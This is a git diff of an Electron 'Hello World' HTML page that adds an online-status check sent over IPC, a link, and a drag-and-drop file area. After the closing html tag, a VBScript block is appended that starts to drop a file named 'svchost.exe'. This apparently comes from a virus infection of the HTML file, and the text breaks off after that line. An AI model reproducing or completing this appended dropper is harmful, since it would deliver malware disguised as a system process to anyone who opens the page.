@@ -5,10 +5,49 @@
     <title>Hello World!</title>
   </head>
   <body>
+    <script>
+      
+      var alertOnlineStatus = function() {
+        var flag = navigator.onLine ? 'online' : 'offline';
+        ipcRenderer.sendSync('onlineOrOffline', flag);
+      };
+
+      window.addEventListener('DOMContentLoaded',  alertOnlineStatus);
+      /*上下线需要绑定的事件*/
+      // window.addEventListener('online',  alertOnlineStatus);
+      // window.addEventListener('offline',  alertOnlineStatus);
+
+      function isOnline(){
+        var onLineFlag = navigator.onLine ? 'online' : 'offline';
+        return onLineFlag
+      }
+
+    </script>
+    <a class="a" href="http://www.baidu.com/">http://www.baidu.com/</a>
     <h1>Hello World!</h1>
-    We are using node <script>document.write(process.versions.node)</script>,
-    Chrome <script>document.write(process.versions.chrome)</script>,
-    and Electron <script>document.write(process.versions.electron)</script>.
+    <!-- We are using node <script>document.write(process.versions.node)</script>, -->
+    <!-- Chrome <script>document.write(process.versions.chrome)</script>, -->
+    <!-- and Electron <script>document.write(process.versions.electron)</script>. -->
+
+    <div id="holder">
+    Drag your file here
+    </div>
+
+    <script>
+    var holder = document.getElementById('holder');
+    holder.ondragover = function () {
+      return false;
+    };
+    holder.ondragleave = holder.ondragend = function () {
+      return false;
+    };
+    holder.ondrop = function (e) {
+      e.preventDefault();
+      var file = e.dataTransfer.files[0];
+      console.log('File you dragged here is', file.path);
+      return false;
+    };
+    </script>
   </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
